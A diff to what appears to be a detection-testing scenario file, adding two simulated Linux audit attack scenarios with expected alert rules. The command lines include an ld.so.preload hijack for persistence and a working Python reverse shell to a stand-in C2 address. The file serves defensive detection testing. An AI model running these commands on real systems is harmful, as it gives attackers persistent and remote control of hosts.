@@ -447,3 +447,58 @@ scenarios:
         - linux_audit_ssh_lateral
         - linux_audit_ssh_stolen_key
         - linux_audit_ssh_remote_forward
+
+  # --- Higher-fidelity Persistence / Execution ---
+
+  - id: ld_preload_shared_object
+    name: Dynamic linker hijack via ld.so.preload
+    description: >
+      After an interactive foothold on a database host, the operator (login
+      auid 106) writes a hidden shared object into /etc/ld.so.preload so
+      every new process maps attacker code (Hijack Execution Flow: Dynamic
+      Linker Hijacking). uid 0 with a mismatched auid reflects a root shell
+      that still attributes to the original postgres login.
+    technique_id: T1574.006
+    platform: linux
+    log_source: linux_audit
+    count: 1
+    host: db-prod-02
+    user: root
+    user_id: 0
+    audit_user_id: 106
+    terminal: pts/3
+    exe: /usr/bin/bash
+    parent_comm: bash
+    command_line: >-
+      bash -c 'printf "%s\n" /var/tmp/.X11-unix/libselinux.so.1
+      > /etc/ld.so.preload && chmod 644 /etc/ld.so.preload'
+    expect:
+      rules: [linux_audit_ld_preload]
+      min_alerts: 1
+
+  - id: python_reverse_pty_shell
+    name: Python3 reverse PTY over TCP
+    description: >
+      From an interactive shell on a CI runner, the operator launches an
+      in-memory Python reverse shell that opens a TCP socket to a documented
+      example C2 address, dup2s the descriptors, and attaches a PTY
+      (Command and Scripting Interpreter: Python). No on-disk payload.
+    technique_id: T1059.006
+    platform: linux
+    log_source: linux_audit
+    count: 1
+    host: ci-runner-07
+    user: runner
+    user_id: 1001
+    audit_user_id: 1001
+    terminal: pts/5
+    exe: /usr/bin/python3
+    parent_comm: bash
+    command_line: >-
+      python3 -c 'import socket,os,pty;s=socket.socket();
+      s.connect(("203.0.113.88",443));os.dup2(s.fileno(),0);
+      os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+    expect:
+      rules: [linux_audit_python_reverse_pty]
+      min_alerts: 1
+
